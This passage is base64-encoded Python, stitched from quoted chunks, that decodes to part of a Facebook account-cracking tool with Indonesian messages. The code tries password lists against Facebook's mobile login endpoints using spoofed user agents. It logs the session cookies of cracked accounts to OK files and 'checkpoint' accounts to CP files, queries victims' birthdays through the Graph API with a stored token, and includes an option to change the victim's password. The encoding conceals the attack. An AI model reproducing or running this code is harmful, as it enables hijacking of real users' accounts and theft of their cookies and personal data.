Mzk2Ljg3IFNhZmFyaS81MzcuMzYiLCJOb2tpYUMzLTAwLzUuMCAoMDcuMjApIFByb2ZpbGUvTUlEUC0yLjEgQ29uZmlndXJhdGlvbi9DTERDLTEuMSBNb3ppbGxhLzUuMCBBcHBsZVdlYktpdC80MjArIChLSFRNTCwgbGlrZSBHZWNrbykgU2FmYXJpLzQyMCsiLCJNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgNS4wOyBBU1VTX1owMEFEIEJ1aWxkL0xSWDIxVikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi80LjAgQ2hyb21lLzM3LjAuMC4wIE1vYmlsZSBTYWZhcmkvNTM3LjM2IiwiW0ZCQU4v""RkI0QSxGQkFWLzIyMi4wLjAuNDguMTEzO0ZCQlYvMTU1MzIzMzY2O0ZCRE0ve2RlbnNpdHk9Mi4wLHdpZHRoPTcyMCxoZWlnaHQ9MTM2MH07RkJMQy9zcl9SUztGQlJWLzE1NjYyNTY5NjtGQkNSL210OnM7RkJNRi9IVUFXRUk7RkJCRC9IVUFXRUksLkZCUE4vY29tLmZhY2Vib29rLmthdGFuYTtGQkRWL0xETi1MMjE7RkJTVi84LjAuMDtGQk9QLzE5LkZCQ0EvYXJtZWFiaS12N2E6YXJtZWFiaSxdIiwiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzkwLjAuNDQzMC45MyBTYWZhcmkvNTM3LjM2Il0pDQogICAgICAgICAgICBleGNlcHQgSU9FcnJvcjoNCiAgICAgICAgICAgIAl1YSA9ICdNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgMTA7IE1pIDlUIFBybyBCdWlsZC9RS1ExLjE5MDgyNS4wMDI7IHd2KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBWZXJzaW9uLzQuMCBDaHJvbWUvODguMC40MzI0LjE4MSBNb2JpbGUgU2FmYXJpLzUzNy4zNltGQkFOL0VNQTtGQkxDL2l0X0lUO0ZCQVYvMjM5LjAuMC4xMC4xMDk7XScNCiAgICAgICAgZWxpZiAiZ2tfcmFuZG9tIiBpbiBzZWxmLnVnZW46DQogICAgICAgIAl0cnk6DQogICAgICAgIAkgICAgdWEgPSBvcGVuKCd1YS50eHQnLCAncicpLnJlYWQoKQ0KICAgICAgICAJZXhjZXB0IElPRXJyb3I6DQogICAgICAgIAkgICAgdWEgPSAnTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDEwOyBNaSA5VCBQcm8gQnVpbGQvUUtRMS4xOTA4MjUuMDAyOyB3dikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi80LjAgQ2hyb21lLzg4LjAuNDMyNC4xODEgTW9iaWxlIFNhZmFyaS81MzcuMzZbRkJBTi9FTUE7RkJMQy9pdF9JVDtGQkFWLzIzOS4wLjAuMTAuMTA5O10nDQogICAgICAgIGZvciBwdyBpbiBtYW51YWw6DQogICAgICAgICAgICBzZXMgPSByZXF1ZXN0cy5TZXNzaW9uKCkNCiAgICAgICAgICAgIHNlcy5oZWFkZXJzLnVwZGF0ZSh7Ikhvc3QiOiJtLmZhY2Vib29rLmNvbSIsInVwZ3JhZGUtaW5zZWN1cmUtcmVxdWVzdHMiOiIxIiwidXNlci1hZ2VudCI6dWEsImFjY2VwdCI6InRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCxpbWFnZS9hcG5nLCovKjtxPTAuOCxhcHBsaWNhdGlvbi9zaWduZWQtZXhjaGFuZ2U7dj1iMztxPTAuOSIsImRudCI6IjEiLCJ4LXJlcXVlc3RlZC13aXRoIjoibWFyay52aWEuZ3AiLCJzZWMtZmV0Y2gtc2l0ZSI6Im5vbmUiLCJzZWMtZmV0Y2gtbW9kZSI6Im5hdmlnYXRlIiwic2VjLWZldGNoLXVzZXIiOiI/MSIsInNlYy1mZXRjaC1kZXN0IjoiZG9jdW1lbnQiLCJyZWZlcmVyIjoiaHR0cHM6Ly9kZXZlbG9wZXJzLmZhY2Vib29rLmNvbS8iLCJhY2NlcHQtZW5jb2RpbmciOiJnemlwLCBkZWZsYXRlIiwiYWNjZXB0""LWxhbmd1YWdlIjoiaWQtSUQsaWQ7cT0wLjksZW4tVVM7cT0wLjgsZW47cT0wLjcifSkNCiAgICAgICAgICAgIHAgPSBzZXMuZ2V0KCdodHRwczovL20uZmFjZWJvb2suY29tL2luZGV4LnBocD9uZXh0PWh0dHBzJTNBJTJGJTJGZGV2ZWxvcGVycy5mYWNlYm9vay5jb20lMkZ0b29scyUyRmRlYnVnJTJGYWNjZXNzdG9rZW4lMkYnKS50ZXh0DQogICAgICAgICAgICBkYXRhYSA9eyJsc2QiOnJlLnNlYXJjaCgnbmFtZT0ibHNkIiB2YWx1ZT0iKC4qPykiJywgc3RyKHApKS5ncm91cCgxKSwiamF6b2VzdCI6cmUuc2VhcmNoKCduYW1lPSJqYXpvZXN0IiB2YWx1ZT0iKC4qPykiJywgc3RyKHApKS5ncm91cCgxKSwidWlkIjp1c2VyLCJmbG93IjoibG9naW5fbm9fcGluIiwicGFzcyI6cHcsIm5leHQiOiJodHRwczovL2RldmVsb3BlcnMuZmFjZWJvb2suY29tL3Rvb2xzL2RlYnVnL2FjY2Vzc3Rva2VuLyJ9DQogICAgICAgICAgICBzZXMuaGVhZGVycy51cGRhdGUoeyJIb3N0IjoibS5mYWNlYm9vay5jb20iLCJjYWNoZS1jb250cm9sIjoibWF4LWFnZT0wIiwidXBncmFkZS1pbnNlY3VyZS1yZXF1ZXN0cyI6IjEiLCJvcmlnaW4iOiJodHRwczovL20uZmFjZWJvb2suY29tIiwiY29udGVudC10eXBlIjoiYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkIiwidXNlci1hZ2VudCI6dWEsImFjY2VwdCI6InRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCxpbWFnZS9hcG5nLCovKjtxPTAuOCxhcHBsaWNhdGlvbi9zaWduZWQtZXhjaGFuZ2U7dj1iMztxPTAuOSIsIngtcmVxdWVzdGVkLXdpdGgiOiJtYXJrLnZpYS5ncCIsInNlYy1mZXRjaC1zaXRlIjoic2FtZS1vcmlnaW4iLCJzZWMtZmV0Y2gtbW9kZSI6Im5hdmlnYXRlIiwic2VjLWZldGNoLXVzZXIiOiI/MSIsInNlYy1mZXRjaC1kZXN0IjoiZG9jdW1lbnQiLCJyZWZlcmVyIjoiaHR0cHM6Ly9tLmZhY2Vib29rLmNvbS9pbmRleC5waHA/bmV4dD1odHRwcyUzQSUyRiUyRmRldmVsb3BlcnMuZmFjZWJvb2suY29tJTJGdG9vbHMlMkZkZWJ1ZyUyRmFjY2Vzc3Rva2VuJTJGIiwiYWNjZXB0LWVuY29kaW5nIjoiZ3ppcCwgZGVmbGF0ZSIsImFjY2VwdC1sYW5ndWFnZSI6ImlkLUlELGlkO3E9MC45LGVuLVVTO3E9MC44LGVuO3E9MC43In0pDQogICAgICAgICAgICBwbyA9IHNlcy5wb3N0KCdodHRwczovL20uZmFjZWJvb2suY29tL2xvZ2luL2RldmljZS1iYXNlZC92YWxpZGF0ZS1wYXNzd29yZC8/c2hibD0wJyxkYXRhPWRhdGFhLGFsbG93X3JlZGlyZWN0cz1GYWxzZSk7amVkYSgyKQ0KICAgICAgICAgICAgaWYgJ2NfdXNlcicgaW4gc2VzLmNvb2tpZXMuZ2V0X2RpY3QoKToNCiAgICAgICAgICAgIAlrdWtpcz0iOyIuam9pbihba2V5KyI9Iit2YWx1ZSBmb3Iga2V5LHZhbHVlIGluIHNlcy5jb29raWVzLmdldF9kaWN0KCkuaXRlbXMoKV0pDQogICAgICAgICAgICAgICAgcHJpbnQgKCdcciAlcyotLT4gJXMg4peK""ICVzIOKXiiAlcyAnJShILHVzZXIscHcsa3VraXMpKQ0KICAgICAgICAgICAgICAgIG9rLmFwcGVuZCgnJXMg4peKICVzIOKXiiAlcyclKHVzZXIscHcsa3VraXMpKQ0KICAgICAgICAgICAgICAgIG9wZW4oJ09LLyVzLnR4dCclKHdha3R1KSwgJ2EnKS53cml0ZSgnICotLT4gJXMg4peKICVzIOKXiiAlc1xuJyUodXNlcixwdyxrdWtpcykpDQogICAgICAgICAgICAgICAgaWt1dGlfZ3coa3VraXMpDQogICAgICAgICAgICAgICAgYnJlYWsNCiAgICAgICAgICAgIGVsaWYgJ2NoZWNrcG9pbnQnIGluIHNlcy5jb29raWVzLmdldF9kaWN0KCk6DQogICAgICAgICAgICAgICAgaWYgIm11bmN1bCIgaW4gc2VsZi5vcHNpX2M6DQogICAgICAgICAgICAJICAgIHRyeToNCiAgICAgICAgICAgIAkgICAgICAgIHJvbXogPSBvcGVuKCdkYXRhL3Rva2VuLnR4dCcpLnJlYWQoKQ0KICAgICAgICAgICAgICAgICAgICAgICAgbGFoaXIgPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLyVzP2FjY2Vzc190b2tlbj0lcyclKHVzZXIscm9teikpLmpzb24oKVsnYmlydGhkYXknXQ0KICAgICAgICAgICAgICAgICAgICAgICAgbW9udGgsIGRheSwgeWVhciA9IGxhaGlyLnNwbGl0KCcvJykNCiAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYuY3I0Y2sodXNlcixwdyxkYXksbW9udGgseWVhcikNCiAgICAgICAgICAgICAgICAgICAgICAgIGNwLmFwcGVuZCgiJXMg4peKICVzIOKXiiAlcyAlcyAlcyIlKHVzZXIscHcsZGF5LG1vbnRoLHllYXIpKQ0KICAgICAgICAgICAgICAgICAgICAgICAgb3BlbignQ1AvJXMudHh0JyAlKHdha3R1KSwgJ2EnKS53cml0ZSgiICotLT4gJXMg4peKICVzIOKXiiAlcyAlcyAlc1xuIiUgKHVzZXIscHcsZGF5LG1vbnRoLHllYXIpKQ0KICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWsNCiAgICAgICAgICAgICAgICAgICAgZXhjZXB0IEtleUVycm9yOg0KICAgICAgICAgICAgICAgICAgICAJZGF5ID0gJycNCiAgICAgICAgICAgICAgICAgICAgICAgIG1vbnRoICAgPSAnJw0KICAgICAgICAgICAgICAgICAgICAgICAgeWVhciAgPSAnJw0KICAgICAgICAgICAgICAgICAgICBleGNlcHQ6IHBhc3MNCiAgICAgICAgICAgICAgICAgICAgc2VsZi5jcjNjayh1c2VyLHB3KQ0KICAgICAgICAgICAgICAgICAgICBjcC5hcHBlbmQoJyVzIOKXiiAlcyclKHVzZXIscHcpKQ0KICAgICAgICAgICAgICAgICAgICBvcGVuKCdDUC8lcy50eHQnICUod2FrdHUpLCAnYScpLndyaXRlKCIgKi0tPiAlcyDil4ogJXNcbiIgJSAodXNlcixwdykpDQogICAgICAgICAgICAgICAgICAgIGJyZWFrDQogICAgICAgICAgICAgICAgZWxpZiAiZ2tfbXVuY3VsIiBpbiBzZWxmLm9wc2lfYzoNCiAgICAgICAgICAgICAgICAJdHJ5Og0KICAgICAgICAgICAgICAgIAkgICAgcm9teiA9IG9wZW4oJ2RhdGEvdG9rZW4udHh0JykucmVhZCgpDQogICAgICAgICAgICAgICAgCSAgICBsYWhpciA9IHJlcXVlc3RzLmdldCgnaHR0cHM6Ly9ncmFw""aC5mYWNlYm9vay5jb20vJXM/YWNjZXNzX3Rva2VuPSVzJyUodXNlcixyb216KSkuanNvbigpWydiaXJ0aGRheSddDQogICAgICAgICAgICAgICAgCSAgICBtb250aCwgZGF5LCB5ZWFyID0gbGFoaXIuc3BsaXQoJy8nKQ0KICAgICAgICAgICAgICAgIAkgICAgcHJpbnQgJ1xyICVzKi0tPiAlcyDil4ogJXMg4peKICVzICVzICVzICAnICUgKEssdXNlcixwdyxkYXksbW9udGgseWVhcikNCiAgICAgICAgICAgICAgICAJICAgIGNwLmFwcGVuZCgiJXMg4peKICVzIOKXiiAlcyAlcyAlcyIlKHVzZXIscHcsZGF5LG1vbnRoLHllYXIpKQ0KICAgICAgICAgICAgICAgIAkgICAgb3BlbignQ1AvJXMudHh0JyAlKHdha3R1KSwgJ2EnKS53cml0ZSgiICotLT4gJXMg4peKICVzIOKXiiAlcyAlcyAlc1xuIiUgKHVzZXIscHcsZGF5LG1vbnRoLHllYXIpKQ0KICAgICAgICAgICAgICAgIAkgICAgYnJlYWsNCiAgICAgICAgICAgICAgICAJZXhjZXB0IEtleUVycm9yOg0KICAgICAgICAgICAgICAgIAkgICAgZGF5ID0gJycNCiAgICAgICAgICAgICAgICAJICAgIG1vbnRoICAgPSAnJw0KICAgICAgICAgICAgICAgIAkgICAgeWVhciAgPSAnJw0KICAgICAgICAgICAgICAgIAlleGNlcHQ6IHBhc3MNCiAgICAgICAgICAgICAgICAJcHJpbnQgJ1xyICVzKi0tPiAlcyDil4ogJXMgICAgICAgICAgICcgJSAoSyx1c2VyLHB3KQ0KICAgICAgICAgICAgICAgIAljcC5hcHBlbmQoJyVzIOKXiiAlcyclKHVzZXIscHcpKQ0KICAgICAgICAgICAgICAgIAlvcGVuKCdDUC8lcy50eHQnICUod2FrdHUpLCAnYScpLndyaXRlKCIgKi0tPiAlcyDil4ogJXNcbiIgJSAodXNlcixwdykpDQogICAgICAgICAgICAgICAgCWJyZWFrDQogICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgCWNvbnRpbnVlDQogICAgICAgIGxvb3AgKz0gMQ0KICAgICAgICB3YXJuYSA9IHJhbmRvbS5jaG9pY2UoW00sIEgsIEssIEIsIFUsIE8sIFBdKQ0KICAgICAgICBwcmludCgnXHInK3dhcm5hKyfigKJceDFiWzE7OTZtIFtjcmFja10gJXMvJXMgW09LOiVzXS1bQ1A6JXNdJyUobG9vcCxsZW4oc2VsZi5pZCksbGVuKG9rKSxsZW4oY3ApKSksDQogICAgICAgIHN5cy5zdGRvdXQuZmx1c2goKQ0KICAgIyBPUFNJIFNBQVQgQ1JBQ0sNCiAgICBkZWYgY3I0Y2soc2VsZix1aWQscHcsZGF5LG1vbnRoLHllYXIpOg0KICAgICAgICBzZXMgPSByZXF1ZXN0cy5TZXNzaW9uKCkNCiAgICAgICAgbWIgPSAoImh0dHBzOi8vbWJhc2ljLmZhY2Vib29rLmNvbSIpDQogICAgICAgIHVhID0gKCJNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgNS4wOyBBU1VTX1owMEFEIEJ1aWxkL0xSWDIxVikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi80LjAgQ2hyb21lLzM3LjAuMC4wIE1vYmlsZSBTYWZhcmkvNTM3LjM2IikNCiAgICAgICAgb3B0aW9uID0gW10NCiAgICAgICAgc2VzLmhlYWRlcnMudXBkYXRlKHsiSG9zdCI6ICJtYmFzaWMuZmFjZWJvb2suY29tIiwiY2FjaGUt""Y29udHJvbCI6ICJtYXgtYWdlPTAiLCJ1cGdyYWRlLWluc2VjdXJlLXJlcXVlc3RzIjogIjEiLCJvcmlnaW4iOiBtYiwiY29udGVudC10eXBlIjogImFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCIsInVzZXItYWdlbnQiOiB1YSwiYWNjZXB0IjogInRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL3dlYnAsaW1hZ2UvYXBuZywqLyo7cT0wLjgsYXBwbGljYXRpb24vc2lnbmVkLWV4Y2hhbmdlO3Y9YjM7cT0wLjkiLCJ4LXJlcXVlc3RlZC13aXRoIjogIm1hcmsudmlhLmdwIiwic2VjLWZldGNoLXNpdGUiOiAic2FtZS1vcmlnaW4iLCJzZWMtZmV0Y2gtbW9kZSI6ICJuYXZpZ2F0ZSIsInNlYy1mZXRjaC11c2VyIjogIj8xIiwic2VjLWZldGNoLWRlc3QiOiAiZG9jdW1lbnQiLCJyZWZlcmVyIjogbWIrIi9sb2dpbi8/bmV4dCZyZWY9ZGJsJmZsJnJlZmlkPTgiLCJhY2NlcHQtZW5jb2RpbmciOiAiZ3ppcCwgZGVmbGF0ZSIsImFjY2VwdC1sYW5ndWFnZSI6ICJpZC1JRCxpZDtxPTAuOSJ9KQ0KICAgICAgICBkYXRhID0ge30NCiAgICAgICAgZ2VkID0gcGFyc2VyKHNlcy5nZXQobWIrIi9sb2dpbi8/bmV4dCZyZWY9ZGJsJmZsJnJlZmlkPTgiLCBoZWFkZXJzPXsidXNlci1hZ2VudCI6dWF9KS50ZXh0LCAiaHRtbC5wYXJzZXIiKQ0KICAgICAgICBmbSA9IGdlZC5maW5kKCJmb3JtIix7Im1ldGhvZCI6InBvc3QifSkNCiAgICAgICAgbGlzdCA9IFsibHNkIiwiamF6b2VzdCIsIm1fdHMiLCJsaSIsInRyeV9udW1iZXIiLCJ1bnJlY29nbml6ZWRfdHJpZXMiLCJsb2dpbiIsImJpX3hyd2giXQ0KICAgICAgICBmb3IgaSBpbiBmbS5maW5kX2FsbCgiaW5wdXQiKToNCiAgICAgICAgICAgIGlmIGkuZ2V0KCJuYW1lIikgaW4gbGlzdDoNCiAgICAgICAgICAgIAlkYXRhLnVwZGF0ZSh7aS5nZXQoIm5hbWUiKTppLmdldCgidmFsdWUiKX0pDQogICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgICAgIGNvbnRpbnVlDQogICAgICAgIGRhdGEudXBkYXRlKHsiZW1haWwiOnVpZCwicGFzcyI6cHd9KQ0KICAgICAgICBydW4gPSBwYXJzZXIoc2VzLnBvc3QobWIrZm0uZ2V0KCJhY3Rpb24iKSwgZGF0YT1kYXRhLCBhbGxvd19yZWRpcmVjdHM9VHJ1ZSkudGV4dCwgImh0bWwucGFyc2VyIikNCiAgICAgICAgdXJsUG9zdD1zZXMucG9zdChtYitmbS5nZXQoImFjdGlvbiIpLGRhdGE9ZGF0YSkNCiAgICAgICAgaWYgIlRlbXVrYW4gQWt1biBBbmRhIiBpbiByZS5maW5kYWxsKCJcPHRpdGxlPiguKj8pPFwvdGl0bGU+IixzdHIodXJsUG9zdC50ZXh0KSk6DQogICAgICAgIAlwcmludCgiXHIgICAgICAlcyEgbW9kZSBwZXNhd2F0a2FuIDIgZGV0aWsgICAiJShNKSkNCiAgICAgICAgaWYgImNoZWNrcG9pbnQiIGluIHNlcy5jb29raWVzLmdldF9kaWN0KCk6DQogICAgICAgICAgICBmb3JtID0gcnVuLmZpbmQoImZvcm0iKQ0KICAgICAgICAgICAgdGl0bGU9cmUuZmluZGFsbCgiXDx0aXRsZT4oLio/""KTxcL3RpdGxlPiIsc3RyKHJ1bikpDQogICAgICAgICAgICBsaW5rMj1ydW4uZmluZCgiZm9ybSIseyJtZXRob2QiOiJwb3N0In0pDQogICAgICAgICAgICBkdHNnID0gZm9ybS5maW5kKCJpbnB1dCIseyJuYW1lIjoiZmJfZHRzZyJ9KVsidmFsdWUiXQ0KICAgICAgICAgICAganpzdCA9IGZvcm0uZmluZCgiaW5wdXQiLHsibmFtZSI6Imphem9lc3QifSlbInZhbHVlIl0NCiAgICAgICAgICAgIG5oICAgPSBmb3JtLmZpbmQoImlucHV0Iix7Im5hbWUiOiJuaCJ9KVsidmFsdWUiXQ0KICAgICAgICAgICAgZGF0YUQgPSB7ImZiX2R0c2ciOiBkdHNnLCJmYl9kdHNnIjogZHRzZywiamF6b2VzdCI6IGp6c3QsImphem9lc3QiOiBqenN0LCJjaGVja3BvaW50X2RhdGEiOiIiLCJzdWJtaXRbQ29udGludWVdIjoiTGFuanV0a2FuIiwibmgiOiBuaH0NCiAgICAgICAgICAgIHhueHggPSBwYXJzZXIoc2VzLnBvc3QobWIrZm9ybVsiYWN0aW9uIl0sIGRhdGE9ZGF0YUQpLnRleHQsICJodG1sLnBhcnNlciIpDQogICAgICAgICAgICBuZ2V3ID0gW3l5LnRleHQgZm9yIHl5IGluIHhueHguZmluZF9hbGwoIm9wdGlvbiIpXQ0KICAgICAgICAgICAgcHJpbnQgJ1xyICVzKi0tPiAlcyDil4ogJXMg4peKICVzICVzICVzICAnICUgKEssdWlkLHB3LGRheSxtb250aCx5ZWFyKQ0KICAgICAgICAgICAgZm9yIG9wdCBpbiByYW5nZShsZW4obmdldykpOiAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIHByaW50KCIgICAgICAlcyVzLiAlcyVzICIlKFAsc3RyKG9wdCsxKSxLLG5nZXdbb3B0XSkpDQogICAgICAgICAgICBpZiAiMCIgaW4gc3RyKGxlbihuZ2V3KSk6DQogICAgICAgICAgICAJaWYgIkxpaGF0IGRldGFpbCBsb2dpbiB5YW5nIGRpdGFtcGlsa2FuLiBJbmkgQW5kYT8iIGluIHRpdGxlOg0KICAgICAgICAgICAgCSAgICBjb2tpID0gKCI7Iikuam9pbihbICIlcz0lcyIgJSAoa2V5LCB2YWx1ZSkgZm9yIGtleSwgdmFsdWUgaW4gc2VzLmNvb2tpZXMuZ2V0X2RpY3QoKS5pdGVtcygpIF0pDQogICAgICAgICAgICAgICAgICAgIGlmICJ1YmFoIiBpbiBzZWxmLnViYWhfcGFzczoNCiAgICAgICAgICAgICAgICAgICAgCXNlbGYudWJhaF9wdyh1aWQscHcsc2VzLHJ1bixsaW5rMikNCiAgICAgICAgICAgICAgICAgICAgZWxzZToNCiAgICAgICAgICAgICAgICAgICAgCXByaW50KCJcciAgICAgICVz4oiaIGFrdW4gb25lIHRhYiwgc2lsYWhrYW4gYW5kYSBsb2dpbiAgICAiJShIKSkNCiAgICAgICAgICAgICAgICAgICAgICAgIG9wZW4oJ09LLyVzLnR4dCcgJSh3YWt0dSksICdhJykud3JpdGUoIiAqLS0+ICVzIOKXiiAlcyDil4ogJXMgJXMgJXNcbiIlICh1aWQscHcsZGF5LG1vbnRoLHllYXIpKQ0KICAgICAgICAgICAgICAgIGVsaWYgIk1hc3Vra2FuIEtvZGUgTWFzdWsgdW50dWsgTWVsYW5qdXRrYW4iIGluIHJlLmZpbmRhbGwoIlw8dGl0bGU+KC4qPyk8XC90aXRsZT4iLHN0cihydW4pKToNCiAgICAgICAgICAgICAgICAJcHJpbnQoIlxyICAgICAgJXPD""lyBha3VuIHRlcnBhc2FuZyBhdXRlbnRpZmlrYXNpIDIgZmFrdG9yICAgIiUoTSkpDQogICAgICAgICAgICAgICAgZWxzZToNCiAgICAgICAgICAgICAgICAJcHJpbnQoIlxyICAgICAgJXMhIHRlcmtlbmEgc3BhbSwgbW9kZSBwZXNhd2F0a2FuIDIgZGV0aWsgICAiJShNKSkNCiAgICAgICAgICAgIHByaW50KCJcciVzIyVzLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0lcz4iJShQLE0sUCkpDQogICAgICAgIGVsaWYgImNfdXNlciIgaW4gc2VzLmNvb2tpZXMuZ2V0X2RpY3QoKToNCiAgICAgICAgCXByaW50ICdcciAlcyotLT4gJXMg4peKICVzIOKXiiAlcyAlcyAlcyAgJyAlIChLLHVpZCxwdyxkYXksbW9udGgseWVhcikNCiAgICAgICAgCXByaW50KCJcciAgICAgICVz4oiaIGFrdW4gdGlkYWsgY2hlY2twb2ludCwgc2lsYWhrYW4gYW5kYSBsb2dpbiAgICIlKEgpKQ0KICAgICAgICAJcHJpbnQoIlxyJXMjJXMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSVzPiIlKFAsTSxQKSkNCiAgICAgICAgCW9wZW4oJ09LLyVzLnR4dCcgJSh3YWt0dSksICdhJykud3JpdGUoIiAqLS0+ICVzIOKXiiAlcyDil4ogJXMgJXMgJXNcbiIlICh1aWQscHcsZGF5LG1vbnRoLHllYXIpKQ0KICAgICAgICBlbGlmICJsb2dpbl9lcnJvciIgaW4gc3RyKHJ1bik6DQogICAgICAgIAlwcmludCAnXHIgJXMqLS0+ICVzIOKXiiAlcyDil4ogJXMgJXMgJXMgICcgJSAoSyx1aWQscHcsZGF5LG1vbnRoLHllYXIpDQogICAgICAgIAlwcmludCgiXHIlcyMlcy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tJXM+IiUoUCxNLFApKQ0KICAgICAgICBlbHNlOg0KICAgICAgICAJcHJpbnQgJ1xyICVzKi0tPiAlcyDil4ogJXMg4peKICVzICVzICVzICAnICUgKEssdWlkLHB3LGRheSxtb250aCx5ZWFyKQ0KICAgICAgICAJcHJpbnQoIlxyJXMjJXMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSVzPiIlKFAsTSxQKSkNCiAgICBkZWYgY3IzY2soc2VsZix1aWQscHcpOg0KICAgICAgICBzZXMgPSByZXF1ZXN0cy5TZXNzaW9uKCkNCiAgICAgICAgbWIgPSAoImh0dHBzOi8vbWJhc2ljLmZhY2Vib29rLmNvbSIpDQogICAgICAgIHVhID0gKCJNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgNS4wOyBBU1VTX1owMEFEIEJ1aWxkL0xSWDIxVikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi80LjAgQ2hyb21lLzM3LjAuMC4wIE1vYmlsZSBTYWZhcmkvNTM3LjM2IikNCiAgICAgICAgb3B0aW9uID0gW10NCiAgICAgICAgc2VzLmhlYWRlcnMudXBkYXRlKHsiSG9zdCI6ICJtYmFzaWMuZmFjZWJvb2suY29tIiwiY2FjaGUtY29udHJvbCI6ICJtYXgtYWdlPTAiLCJ1cGdyYWRlLWluc2VjdXJlLXJlcXVlc3RzIjogIjEiLCJvcmlnaW4iOiBtYiwiY29udGVudC10eXBlIjogImFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5j""b2RlZCIsInVzZXItYWdlbnQiOiB1YSwiYWNjZXB0IjogInRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL3dlYnAsaW1hZ2UvYXBuZywqLyo7cT0wLjgsYXBwbGljYXRpb24vc2lnbmVkLWV4Y2hhbmdlO3Y9YjM7cT0wLjkiLCJ4LXJlcXVlc3RlZC13aXRoIjogIm1hcmsudmlhLmdwIiwic2VjLWZldGNoLXNpdGUiOiAic2FtZS1vcmlnaW4iLCJzZWMtZmV0Y2gtbW9kZSI6ICJuYXZpZ2F0ZSIsInNlYy1mZXRjaC11c2VyIjogIj8xIiwic2VjLWZldGNoLWRlc3QiOiAiZG9jdW1lbnQiLCJyZWZlcmVyIjogbWIrIi9sb2dpbi8/bmV4dCZyZWY9ZGJsJmZsJnJlZmlkPTgiLCJhY2NlcHQtZW5jb2RpbmciOiAiZ3ppcCwgZGVmbGF0ZSIsImFjY2VwdC1sYW5ndWFnZSI6ICJpZC1JRCxpZDtxPTAuOSJ9KQ0KICAgICAgICBkYXRhID0ge30NCiAgICAgICAgZ2VkID0gcGFyc2VyKHNlcy5nZXQobWIrIi9sb2dpbi8/bmV4dCZyZWY9ZGJsJmZsJnJlZmlkPTgiLCBoZWFkZXJzPXsidXNlci1hZ2VudCI6dWF9KS50ZXh0LCAiaHRtbC5wYXJzZXIiKQ0KICAgICAgICBmbSA9IGdlZC5maW5kKCJmb3JtIix7Im1ldGhvZCI6InBvc3QifSkNCiAgICAgICAgbGlzdCA9IFsibHNkIiwiamF6b2VzdCIsIm1fdHMiLCJsaSIsInRyeV9udW1iZXIiLCJ1bnJlY29nbml6ZWRfdHJpZXMiLCJsb2dpbiIsImJpX3hyd2giXQ0KICAgICAgICBmb3IgaSBpbiBmbS5maW5kX2FsbCgiaW5wdXQiKToNCiAgICAgICAgICAgIGlmIGkuZ2V0KCJuYW1lIikgaW4gbGlzdDoNCiAgICAgICAgICAgIAlkYXRhLnVwZGF0ZSh7aS5nZXQoIm5hbWUiKTppLmdldCgidmFsdWUiKX0pDQogICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgICAgIGNvbnRpbnVlDQogICAgICAgIGRhdGEudXBkYXRlKHsiZW1haWwiOnVpZCwicGFzcyI6cHd9KQ0KICAgICAgICBydW4gPSBwYXJzZXIoc2VzLnBvc3QobWIrZm0uZ2V0KCJhY3Rpb24iKSwgZGF0YT1kYXRhLCBhbGxvd19yZWRpcmVjdHM9VHJ1ZSkudGV4dCwgImh0bWwucGFyc2VyIikNCiAgICAgICAgdXJsUG9zdD1zZXMucG9zdChtYitmbS5nZXQoImFjdGlvbiIpLGRhdGE9ZGF0YSkNCiAgICAgICAgaWYgIlRlbXVrYW4gQWt1biBBbmRhIiBpbiByZS5maW5kYWxsKCJcPHRpdGxlPiguKj8pPFwvdGl0bGU+IixzdHIodXJsUG9zdC50ZXh0KSk6DQogICAgICAgIAlwcmludCgiXHIgICAgICAlcyEgbW9kZSBwZXNhd2F0a2FuIDIgZGV0aWsgICAiJShNKSkNCiAgICAgICAgaWYgImNoZWNrcG9pbnQiIGluIHNlcy5jb29raWVzLmdldF9kaWN0KCk6DQogICAgICAgICAgICBmb3JtID0gcnVuLmZpbmQoImZvcm0iKQ0KICAgICAgICAgICAgdGl0bGU9cmUuZmluZGF